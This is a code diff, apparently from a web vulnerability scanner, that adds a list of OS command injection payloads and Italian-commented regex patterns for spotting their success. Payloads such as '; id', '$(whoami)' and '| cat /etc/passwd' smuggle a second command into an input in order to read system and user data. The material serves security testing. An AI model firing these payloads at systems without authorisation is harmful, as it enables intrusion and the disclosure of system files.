@@ -182,6 +182,43 @@ INFO_LEAK_HEADERS = [
     "X-Generator",
 ]
 
+# OS Command Injection payloads
+CMDI_PAYLOADS = [
+    "; id",
+    "| id",
+    "` id`",
+    "$(id)",
+    "; whoami",
+    "| whoami",
+    "$(whoami)",
+    "; cat /etc/passwd",
+    "| cat /etc/passwd",
+    "$(cat /etc/passwd)",
+    "; uname -a",
+    "| uname -a",
+    "& whoami",           # Windows
+    "| dir",              # Windows
+    "; dir",              # Windows
+    "$(dir)",             # Windows
+    "1; id",
+    "1 | id",
+    "1$(id)",
+    "1`id`",
+]
+
+# Patterns that indicate successful command injection
+CMDI_PATTERNS = [
+    (r"uid=\d+\(", "output di 'id' (Linux/Unix)"),
+    (r"root:x:0:0:", "contenuto di /etc/passwd"),
+    (r"Linux\s+\S+\s+\d+\.\d+", "output di 'uname -a'"),
+    (r"Windows\s+\S+\s+\[Version", "output di 'ver' (Windows)"),
+    (r"Volume\s+in\s+drive", "output di 'dir' (Windows)"),
+    (r"Directory\s+of\s+", "output di 'dir' (Windows)"),
+    (r"daemon:x:1:", "utente daemon in /etc/passwd"),
+    (r"nobody:x:", "utente nobody in /etc/passwd"),
+    (r"/bin/(bash|sh|dash)", "path shell trovato"),
+]
+
 # Subdomain wordlist (compact)
 SUBDOMAIN_WORDLIST = [
     "www", "mail", "ftp", "admin", "blog", "dev", "staging", "test",
